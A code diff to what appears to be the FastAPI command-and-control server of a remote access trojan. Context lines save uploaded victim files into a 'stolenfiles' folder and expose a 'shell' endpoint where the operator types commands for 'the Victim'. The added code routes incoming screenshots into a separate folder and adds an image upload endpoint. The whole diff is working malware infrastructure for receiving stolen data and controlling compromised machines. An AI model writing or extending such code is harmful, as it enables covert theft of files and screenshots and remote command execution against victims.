@@ -1,8 +1,9 @@
 from fastapi import FastAPI, File, UploadFile
 from pydantic import BaseModel
-import sqlite3
 import os 
 import threading
+from PIL import Image
+import io 
 import tkinter as tk
 from tkinter import colorchooser
 from pygments import highlight
@@ -129,7 +130,9 @@ class TextPayload(BaseModel):
     file_name:str
     data:str
 
-
+class imgt(BaseModel):
+    file_name:str
+    data:str
 
 app = FastAPI()
 
@@ -140,10 +143,18 @@ async def recivePaylaod(File_param:UploadFile):
         os.mkdir(os.getcwd()+"/stolenfiles")
     except:
         pass
-    
-    with open(f"{os.getcwd()}/stolenfiles/{File_param.filename}",'wb') as f:
-        contents = await File_param.read()
-        f.write(contents)
+    if '.png' not in File_param.filename:
+        with open(f"{os.getcwd()}/stolenfiles/{File_param.filename}",'wb') as f:
+            contents = await File_param.read()
+            f.write(contents)
+    else:
+        try:
+            os.mkdir(os.getcwd()+"/screenshots")
+        except:
+            pass
+        with open(f"{os.getcwd()}/screenshots/{File_param.filename}",'wb') as f:
+            contents = await File_param.read()
+            f.write(contents)
     
 
 @app.post("/api/recive/text",status_code=200)
@@ -179,3 +190,12 @@ def shell(pcname:str):
     res = input_dialog(title=f"Started a shell with the Victim[ {pcname} ]",message="you commands")
     print(res)
     return {"CMD":str(res)}
+
+
+import datetime
+@app.post("/api/upload/image")
+async def upload_image(file: UploadFile = File(...)):
+    contents = await file.read()
+    image = Image.open(io.BytesIO(contents))
+    image.save(f"{file.filename}")
+    return {"filename": file.filename}
